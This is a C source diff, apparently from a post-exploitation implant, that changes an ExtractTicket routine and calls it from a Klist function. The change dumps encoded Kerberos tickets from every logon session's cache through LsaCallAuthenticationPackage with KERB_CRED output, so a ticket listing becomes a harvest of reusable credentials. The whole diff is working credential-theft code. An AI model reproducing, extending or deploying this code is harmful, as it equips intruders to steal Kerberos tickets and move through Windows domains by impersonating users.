@@ -283,18 +283,22 @@ NTSTATUS GetLogonSessionData( LUID luid, PLOGON_SESSION_DATA* data )
     return status;
 }
 
-
-NTSTATUS ExtractTicket( HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING targetName, PUCHAR* ticket, PULONG ticketSize )
+VOID ExtractTicket( HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING targetName, PUCHAR* ticket, PULONG ticketSize )
 {
-    KERB_RETRIEVE_TKT_REQUEST* retrieveRequest = NULL;
-    KERB_RETRIEVE_TKT_RESPONSE* retrieveResponse = NULL;
-    ULONG responseSize = sizeof( KERB_RETRIEVE_TKT_REQUEST ) + targetName.MaximumLength;
+    PKERB_RETRIEVE_TKT_REQUEST  retrieveRequest  = NULL;
+    PKERB_RETRIEVE_TKT_RESPONSE retrieveResponse = NULL;
+    ULONG                       responseSize     = sizeof( KERB_RETRIEVE_TKT_REQUEST ) + targetName.MaximumLength;
+    NTSTATUS                    status           = STATUS_UNSUCCESSFUL;
+    NTSTATUS                    protocolStatus   = STATUS_UNSUCCESSFUL;
+    ULONG                       TicketSize       = 0;
+    PBYTE                       Ticket           = NULL;
+
     retrieveRequest = Instance.Win32.LocalAlloc( LPTR, responseSize * sizeof( KERB_RETRIEVE_TKT_REQUEST ) );
-    if ( retrieveRequest == NULL )
-    {
-        return STATUS_MEMORY_NOT_ALLOCATED;
-    }
-    retrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
+    if ( ! retrieveRequest )
+        return;
+
+    //retrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
+    retrieveRequest->MessageType = 8;
     retrieveRequest->LogonId = luid;
     retrieveRequest->TicketFlags = 0;
     retrieveRequest->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
@@ -303,43 +307,34 @@ NTSTATUS ExtractTicket( HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRIN
     retrieveRequest->TargetName.Buffer = ( PWSTR )( (PBYTE )retrieveRequest + sizeof( KERB_RETRIEVE_TKT_REQUEST ));
     MemCopy( retrieveRequest->TargetName.Buffer, targetName.Buffer, targetName.MaximumLength );
 
-    NTSTATUS protocolStatus;
-    NTSTATUS status = STATUS_SUCCESS;
-    status = Instance.Win32.LsaCallAuthenticationPackage( hLsa, authPackage, retrieveRequest, responseSize, &retrieveResponse,
-                                                  &responseSize, &protocolStatus );
-    Instance.Win32.LocalFree( retrieveRequest );
-    if ( NT_SUCCESS( status ))
+    status = Instance.Win32.LsaCallAuthenticationPackage( hLsa, authPackage, retrieveRequest, responseSize, &retrieveResponse, &responseSize, &protocolStatus );
+    if ( NT_SUCCESS( status ) && NT_SUCCESS( protocolStatus ) )
     {
-        if ( NT_SUCCESS( protocolStatus ))
+        if ( NT_SUCCESS( protocolStatus ) )
         {
-            if ( responseSize > 0 )
+            TicketSize = retrieveResponse->Ticket.EncodedTicketSize;
+            Ticket = Instance.Win32.LocalAlloc( LPTR, TicketSize );
+            if ( Ticket )
             {
-                ULONG size = retrieveResponse->Ticket.EncodedTicketSize;
-                PUCHAR returnTicket = Instance.Win32.LocalAlloc( LPTR, size * sizeof( UCHAR ) );
-                if ( returnTicket != NULL )
-                {
-                    MemCopy( returnTicket, retrieveResponse->Ticket.EncodedTicket, size );
-                    *ticket = returnTicket;
-                    *ticketSize = size;
-                }
-                else
-                {
-                    status = STATUS_MEMORY_NOT_ALLOCATED;
-                }
-                Instance.Win32.LsaFreeReturnBuffer( retrieveResponse );
+                MemCopy( Ticket, retrieveResponse->Ticket.EncodedTicket, TicketSize );
+                *ticket     = Ticket;
+                *ticketSize = TicketSize;
             }
         }
         else
         {
-            status = Instance.Win32.LsaNtStatusToWinError( protocolStatus );
+            PRINTF( "[!] LsaCallAuthenticationPackage: %lx\n", protocolStatus )
         }
     }
     else
     {
-        status = Instance.Win32.LsaNtStatusToWinError( status );
+        PRINTF( "[!] LsaCallAuthenticationPackage: %lx\n", status )
     }
 
-    return status;
+    if ( retrieveResponse )
+        Instance.Win32.LsaFreeReturnBuffer( retrieveResponse );
+    if ( retrieveRequest )
+        Instance.Win32.LocalFree( retrieveRequest );
 }
 
 VOID CopySessionInfo( PSESSION_INFORMATION Session, PSECURITY_LOGON_SESSION_DATA Data )
@@ -669,6 +664,8 @@ PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )
                 continue;
 
             CopyTicketInfo( TicketInfo, &cacheResponse->Tickets[j] );
+
+            ExtractTicket(hLsa, authPackage, cacheRequest.LogonId, cacheResponse->Tickets[j].ServerName, &TicketInfo->Ticket.Buffer, &TicketInfo->Ticket.Length);
 
             if ( ! NewSession->Tickets )
             {
